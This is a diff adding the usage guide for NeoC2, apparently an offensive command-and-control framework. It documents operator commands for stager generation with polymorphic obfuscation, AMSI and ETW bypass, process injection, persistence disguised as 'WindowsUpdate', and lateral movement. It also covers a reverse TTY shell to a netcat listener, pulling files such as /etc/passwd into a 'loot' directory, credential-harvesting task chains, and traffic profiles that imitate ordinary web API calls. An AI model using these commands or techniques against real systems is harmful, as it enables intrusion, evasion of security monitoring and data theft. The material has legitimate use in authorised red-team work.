@@ -1,0 +1,626 @@
+# GENERAL USAGE GUIDE
+
+## Table of Contents
+- [Agent Management](#agent-management)
+- [Interactive Mode](#interactive-mode)
+- [Payload Generation](#payload-generation)
+- [Listener Management](#listener-management)
+- [Modules and Post-Exploitation](#modules-and-post-exploitation)
+- [Evasion Techniques](#evasion-techniques)
+- [File Operations](#file-operations)
+- [Persistence Mechanisms](#persistence-mechanisms)
+- [Security Features](#security-features)
+- [Task Chaining](#task-chaining-web-ui-only)
+- [Task Management](#task-management)
+- [Profiles and Staging](#profiles-and-staging)
+- [Event Monitoring](#event-monitoring)
+- [Troubleshooting](#troubleshooting)
+
+## Agent Management
+
+### Agent Lifecycle
+
+Agents in NeoC2 follow a complete lifecycle:
+1. **Registration**: Agents connect and register with the C2
+2. **Heartbeat**: Regular check-ins to maintain connection
+3. **Tasking**: Receive and execute commands
+4. **Results**: Send back execution output
+5. **Interaction**: Real-time command execution
+6. **Termination**: Removal from management
+
+### Agent Commands
+
+```
+agent list                    # List all active agents
+agent interact <agent_id>     # Enter interactive mode with agent
+agent info <agent_id>         # Get detailed agent information
+agent kill <agent_id>         # Remove agent from management
+agent execute <agent_id> <cmd> # Queue command for execution
+agnet monitor <agent_id>      #Monitor an agent in multiplayer
+agent unmonitor <agent_id>    #Unmonitor an agent in multiplayer
+```
+
+### Agent Status Indicators
+
+- Active: Agent regularly checking in
+- Inactive: Agent not checking in (but not removed)
+- Removed: Agent explicitly killed/removed
+
+## Interactive Mode
+
+Task-based Interactive mode provides real-time command execution similar to a reverse shell. When activated:
+
+1. Agent polling frequency increases from 30s to 1s
+2. Commands execute immediately
+3. Results return in real-time
+4. Session maintained until 'exit' command
+
+### Entering Interactive Mode
+
+```
+NeoC2 > agent interact <agent-id>
+# Prompt changes to:
+NeoC2 [INTERACTIVE] > 
+```
+
+### Interactive Commands
+
+Any command typed in interactive mode executes directly on the agent:
+```
+NeoC2 [INTERACTIVE:abc123] > whoami
+NeoC2 [INTERACTIVE:abc123] > pwd
+NeoC2 [INTERACTIVE:abc123] > ls -la
+NeoC2 [INTERACTIVE:abc123] > exit
+```
+
+### Interactive Mode Features
+
+- **Real-time Execution**: 1-second polling for immediate response
+- **Persistent Storage**: All results stored in database
+- **Timeout Recovery**: Retrieve late results with result command
+- **Cross-platform**: Works on Windows/Linux/macOS agents
+- **Dual Interface**: Available in both CLI and Web interfaces
+
+## TTY Shell
+
+Start a netcat listener in another terminal and send the command below to the agent. This upgrades interaction with an agent from a task-based interactive mode to a complete TTY Shell
+```
+NeoC2 > tty_shell <ip> <port> # default port is 5000
+```
+
+## Payload Generation
+
+NeoC2 supports multiple payload types with advanced polymorphism:
+
+### Polymorphism Engine
+
+Enable Obfuscation when building a Python Full Agent for the Polymorphic Engine:
+1. Variable/Function Name Randomization - Every generation uses unique identifiers
+2. String Obfuscation - 5 different encoding techniques (base64, hex, char arrays, reverse, split)
+3. Dead Code Injection - Benign junk code that varies each time
+4. Import Shuffling - Randomized import order
+5. Code Structure Variation - Different layouts, same functionality
+
+### Stager Generation
+Generated stagers download payloads from `/api/assets/main.js` Chain this with `payload_upload` BASE-COMMAND
+```
+stager generate <type> host=<host> port=<port> protocol=<protocol>
+```
+
+Example:
+```
+NeoC2 > stager generate bash host=0.0.0.0 port=443 protocol=https
+NeoC2 > stager generate powershell host=0.0.0.0 port=443 protocol=https
+```
+
+### Payload Upload Feature
+
+NeoC2 supports uploading custom payloads directly through the remote cli:
+
+#### Uploading Payloads
+1. Select any payload file (EXE, DLL, PY, JS, etc.) up to 50MB
+2. The payload is automatically XOR encrypted using the SECRET_KEY environment variable
+3. The encrypted payload is Base64 encoded and made available at `/api/assets/main.js`
+
+```
+NeoC2 > payload_upload <options> 
+```
+
+#### Supported Payload Types
+- **Python scripts**: Executed in-memory by droppers (stealthy)
+- **Windows executables (.exe)**: Written to temp directory, executed, and cleaned up
+- **Dynamic link libraries (.dll)**: Can be loaded by appropriate loaders
+- **Other binary files**: Handled according to file type detection
+
+
+## Listener Management
+
+Listeners in NeoC2 are profile-driven, meaning they use predefined communication profiles.
+
+### Listener Commands
+
+```
+listener create <name> <type> <port> [profile_name=<profile>]
+listener list
+listener start <name>
+listener stop <name>
+listener delete <name>
+```
+
+### Profile Integration
+
+When creating a listener, you associate it with a communication profile:
+```
+listener create my_http_listener type=http port=443 profile_name=stealth_crawler
+```
+
+## Modules and Post-Exploitation
+
+NeoC2 includes a modular framework for post-exploitation activities. Using Python, Powershell or Bash. 
+
+### Available Modules
+
+```
+modules list                  # List available modules
+modules load <module_name>    # Load a specific module
+modules info <module_name>    # Get module information
+run <module_name> [options]   # Execute a module
+```
+
+### Module Categories
+
+1. **Evasion**: Bypass security mechanisms
+2. **Persistence**: Maintain access across reboots
+3. **Reconnaissance**: Gather system information
+4. **Lateral Movement**: Move to other systems
+
+### Example Module Usage
+
+```
+# Load and run sleep obfuscation module
+modules load sleep_obfuscation
+run sleep_obfuscation agent_id=<id> technique=jitter
+
+# Load and run persistence module
+modules load persistence
+run persistence agent_id=<id> method=registry payload_path=C:\payload.exe name=WindowsUpdate
+```
+
+## Evasion Techniques
+
+NeoC2 implements multiple evasion techniques to bypass endpoint security:
+
+### Built-in Evasion Methods
+
+1. AMSI Bypass: Anti-Malware Scan Interface bypass
+2. ETW Bypass: Event Tracing for Windows disablement
+3. Sleep Obfuscation: Process hollowing and indirect syscalls
+4. String Encryption: Runtime decryption of sensitive strings
+5. Process Injection: Reflective loading into legitimate processes
+
+### Evasion Commands
+Ensure C2 is in interactive mode before running evasion modules
+```
+interact <agent_id>
+evasion enable <technique>     # Enable specific evasion technique
+evasion disable <technique>    # Disable specific evasion technique
+evasion list                  # List available evasion techniques
+```
+
+## File Operations
+
+NeoC2 provides enhanced file operations with automatic handling of encoded content.
+
+### Download Command
+
+The enhanced `download` command automatically:
+- Creates 'loot' directory if it doesn't exist
+- Detects base64-encoded content
+- Decodes base64 content automatically
+- Saves files with meaningful names and timestamps
+- Reports file sizes
+
+Usage:
+```
+download <agent_id> <remote_path>
+```
+
+Example:
+```
+NeoC2 > download abc12345 /etc/passwd
+[+] Download task queued (Task ID: 123) for '/etc/passwd' from agent abc123...
+[+] Created loot directory: loot
+[+] File downloaded and saved to: loot/20251008_120000_passwd
+[+] Size: 1542 bytes
+```
+
+### Save Command
+
+The `save` command allows manual saving of specific task results:
+- Supports both base64-encoded and plain text results
+- Offers custom filename option
+- Integrates with loot directory system
+
+Usage:
+```
+save <agent_id> <task_id> [filename]
+```
+
+Example:
+```
+NeoC2 > save abc12345 task765 mystuff.txt
+[+] File (base64 decoded) saved to: loot/mystuff.txt
+[+] Size: 2048 bytes
+```
+
+### Result Command
+
+The enhanced `result` command:
+- Shows all results from all agents
+- Displays specific agent results
+- Shows specific task results with detailed information
+- Offers to save file content to loot directory
+
+Usage:
+```
+result list
+result <agent_id>
+result <agent_id> <task_id>
+```
+
+## Persistence Mechanisms
+
+NeoC2 supports multiple persistence methods across platforms:
+
+### Windows Persistence
+
+1. **Registry Keys**: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+2. **Scheduled Tasks**: Using schtasks utility
+3. **WMI Events**: Permanent event subscriptions
+4. **Service Creation**: Installing as Windows service
+5. **Startup Folder**: Adding to user startup directory
+
+### Linux Persistence
+
+1. **Cron Jobs**: Scheduled execution via crontab
+2. **Systemd Services**: Persistent service configuration
+3. **Init Scripts**: Traditional SysV init scripts
+4. **Bashrc Modification**: Adding to shell initialization
+5. **Library Preloading**: LD_PRELOAD technique
+
+### macOS Persistence
+
+1. **Launch Agents**: Property list files in ~/Library/LaunchAgents
+2. **Launch Daemons**: System-wide launch daemons
+3. **Login Items**: Applications that start at login
+4. **Cron Jobs**: Similar to Linux cron
+5. **Shell Profiles**: Modifying .bash_profile, .zshrc
+
+### Persistence Commands
+
+```
+run persistence agent_id=<id> method=<method> [options]
+```
+
+Example:
+```
+run persistence agent_id=abc12345 method=registry payload_path=C:\agent.exe name=WindowsUpdate
+```
+## Lateral Movements Module
+
+Module Features:
+- Multi-platform support: Works on Windows, Linux, and macOS systems
+- Multiple techniques: WMI, SMB, SSH, PsExec, RDP, DCOM, and WinRM
+- Flexible authentication: Supports credential-based and context-based movement
+- Configurable options: Target, technique, credentials, payload path, execution method, and timeout
+
+### Supported Techniques:
+1. WMI (Windows Management Instrumentation): Remote execution via WMI
+2. SMB (Server Message Block): File sharing and execution via network shares
+3. SSH (Secure Shell): Remote execution on Linux/Unix systems
+4. PsExec: Windows remote execution tool
+5. RDP (Remote Desktop Protocol): Drive redirection and session establishment
+6. DCOM (Distributed Component Object Model): Alternative remote execution
+7. WinRM (Windows Remote Management): PowerShell remoting
+
+## Security Features
+
+### Password Security
+
+- **Secure Hashing**: All passwords hashed using Werkzeug security functions
+- **Strong Requirements**: Support for complex password policies
+- **Default Credentials**: Stored as secure hashes, not plain text
+
+### Access Control
+
+NeoC2 implements role-based access control:
+
+1. **Admin Role**: Full access to all framework features
+2. **Operator Role**: Manage agents, execute modules, handle listeners
+3. **Viewer Role**: Read-only access to monitoring and reports
+
+### Session Security
+
+- **Secure Sessions**: Proper session management with authentication
+- **Session Timeout**: Automatic logout after inactivity
+- **Audit Logging**: Track all user actions and system events
+
+### Encrypted Comms
+
+Robust encrypted communication between agents and the C2 server using Fernet's AES-128-CBC, ensuring that only legitimate agents can register and communicate with the server, while all task and result data is encrypted in transit.
+
+## Task Chaining
+
+NeoC2 provides advanced task chaining capabilities, allowing operators to create sequential workflows of multiple modules that execute in a predetermined order on target agents.
+
+### Task Chaining Features
+
+1. **Sequential Execution**: Execute multiple modules in a specific order
+2. **Conditional Logic**: Future module execution based on previous results
+4. **Real-time Monitoring**: Track chain execution progress
+5. **Error Handling**: Automatic chain stopping on module failure
+6. **Persistent Storage**: Save and reuse task chains
+7. **Async Execution**: Queue chains for later execution
+
+### Using Task Chaining
+   
+1. **CLI Usage**:
+
+  ```
+   NeoC2 > taskchain <options>
+   ```
+
+2. **Create New Chain**:
+   - Select target agent from dropdown
+   - Choose modules to chain (in execution order)
+   - Optionally name the chain for future reference
+   - Choose to execute immediately or queue for later
+
+3. **Chain Execution**:
+   - Modules execute sequentially on the target agent
+   - Each module waits for previous module completion
+   - Results from one module can influence the next (future enhancement)
+   - Chain status updates in real-time
+
+#### Chain Creation
+- **Agent Selection**: Choose from all registered agents
+- **Module Selection**: Browse and select multiple modules
+- **Execution Order**: Drag-and-drop to reorder modules
+- **Chain Naming**: Assign descriptive names to chains
+- **Immediate Execution**: Option to run chain immediately after creation
+
+#### Chain Monitoring
+- **Real-time Status**: Live updates on chain progress
+- **Module-by-Module Tracking**: See which module is currently executing
+- **Success/Failure Indicators**: Visual feedback for each module
+- **Detailed Results**: View output from each executed module
+
+#### Chain Management
+- **Chain Library**: Save and organize frequently-used chains
+- **Bulk Operations**: Execute multiple chains simultaneously
+- **Chain Templates**: Create reusable chain templates
+- **Export/Import**: Share chains between operators
+- **Audit Trail**: Track chain creation and execution history
+
+### Example Task Chains
+
+1. **Reconnaissance Chain**:
+   - System information gathering
+   - Network configuration enumeration
+   - User account discovery
+   - Credential harvesting (if applicable)
+
+2. **Evasion Chain**:
+   - AMSI bypass activation
+   - ETW disabling
+   - Sleep obfuscation configuration
+   - Process injection setup
+
+3. **Persistence Chain**:
+   - Registry key modification
+   - Scheduled task creation
+   - Service installation
+   - File system persistence
+
+## Task Management
+
+NeoC2 implements a sophisticated task management system:
+
+### Task Types
+
+1. **Queued Tasks**: Standard command execution
+2. **Interactive Tasks**: Real-time command execution
+3. **Download Tasks**: File retrieval operations
+4. **Upload Tasks**: File transfer to agents
+5. **Module Tasks**: Specialized module execution
+
+### Task Lifecycle
+
+1. **Creation**: Task added to agent queue
+2. **Assignment**: Agent retrieves task
+3. **Execution**: Agent executes task
+4. **Result Submission**: Agent sends results back
+5. **Storage**: Results stored in database
+6. **Notification**: Operator notified of completion
+
+### Task Commands
+
+```
+task list                     # Show pending tasks
+addtask <agent_id> <command>  # Add task to agent queue
+```
+
+## Profiles and Staging
+
+Profiles define communication characteristics for agents:
+
+### Profile Structure
+
+```json
+{
+  "name": "my_https_profile",
+  "description": "Custom HTTPS communication profile",
+  "config": {
+    "endpoints": {
+      "download": "/api/assets/main.js",
+      "register": "/api/users/register",
+      "results": "/api/users/{agent_id}/activity",
+      "tasks": "/api/users/{agent_id}/profile",
+      "interactive": "/api/users/{agent_id}/settings",
+      "interactive_status": "/api/users/{agent_id}/status"
+    },
+    "headers": {
+      "Accept": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    },
+    "heartbeat_interval": 60,
+    "http_get": {
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      },
+      "uri": "/api/v1/info"
+    },
+    "http_post": {
+      "headers": {
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      },
+      "uri": "/api/v1/submit"
+    },
+    "jitter": 0.2,
+    "protocol": "https",
+    "sleep_time": 60,
+    "p2p_enabled": false,
+    "p2p_port": 8888
+  }
+}
+
+```
+ 
+ ### Load Profile to DB
+ 
+```bash
+profile add <config path>
+# Register profile routes 
+listener create <listener_name> https <port> <ip> profile_name=<profile_name>
+```
+
+### Features
+
+- **Malleable Communications**: Customize agent behavior
+- **Evasion Enhancement**: Blend with legitimate traffic
+- **Environment Adaptation**: Adjust to different network environments
+- **Profile Consistency**: Ensure all components use same settings
+
+
+### Save Content
+
+```
+# Save all results from a specific agent to logs directory
+NeoC2 > save logs <agent_id> [limit]
+
+# Save all results from all agents to logs directory
+NeoC2 > save logs all [limit]
+```
+
+- Results saved for long-term analysis and reporting
+- Easy organization and retrieval of results from specific times
+
+### File Location
+- Results are saved in the `logs/` directory
+- Files use format: `results_<identifier>_<timestamp>.txt`
+- Each file contains complete task information with headers and clear formatting
+
+### File Download Capabilities
+- **Base64 Encoding**: Files are automatically base64-encoded during transfer for safe transmission
+- **Command Format**: `download <remote_path>` - queues download task for the agent
+- **Automatic Decoding**: CLI automatically detects and decodes base64 content for storage
+- **Smart Saving**: Files saved to loot directory with timestamps and sanitized names
+- **Progress Tracking**: Task submission and completion monitoring
+
+### File Upload Capabilities
+- **Base64 Encoding**: Local files are base64-encoded before transmission to agent
+- **Command Format**: `upload <remote_path> <base64_data>` - agent receives and decodes the file
+- **CLI Integration**: Use the `upload` command to send files to agents
+- **Example Usage**:
+```
+# Upload a file to the agent
+NeoC2 > upload <agent_id> /path/to/local/script.py /remote/path/script.py
+```
+
+### File Operation Commands
+
+```
+# Download a file from the agent
+download <agent_id> <remote_file_path>
+
+# Download a file from the C2 Server
+download <file_path_on_c2>
+
+# Upload a file to the agent
+upload <agent_id> <local_file_path> <remote_file_path>
+
+# Save specific task results to loot directory
+save <agent_id> <task_id> [custom_filename]
+
+# List results including file operations
+result <agent_id>
+```
+
+## Event Monitoring
+
+All C2 operations are logged. This information can be retrieved using the event handler:
+
+```
+event 
+event list
+event search
+event stats
+```
+
+## Troubleshooting
+
+### Common Issues and Solutions
+
+#### Agent Doesn't Register
+- Check C2 server is running
+- Verify firewall allows connections
+- Check agent can reach server: `curl https://your-server:443/health`
+
+#### Interactive Mode Times Out
+- Increase timeout in `send_interactive_command`
+- Check agent is still running
+- Verify agent is polling (check agent output)
+
+#### Commands Not Executing
+- Check agent logs for errors
+- Verify agent has permissions to execute command
+- Try simple command first: `whoami`
+
+#### Agent Shows as Inactive
+- Check agent is still running
+- Verify network connectivity
+- Agent becomes inactive after 5 minutes of no check-ins
+
+### Debugging Endpoints
+
+```
+curl ip:443/health
+curl ip:443/api/debug/auto-discovery
+curl ip:443/api/debug/endpoints
+```
+
+### Useful CLI Commands for Troubleshooting
+
+```
+status                        # Show framework status
+result list                   # Check for task results
+agent list                    # Verify agent status
+```
+
+
+
+</content>
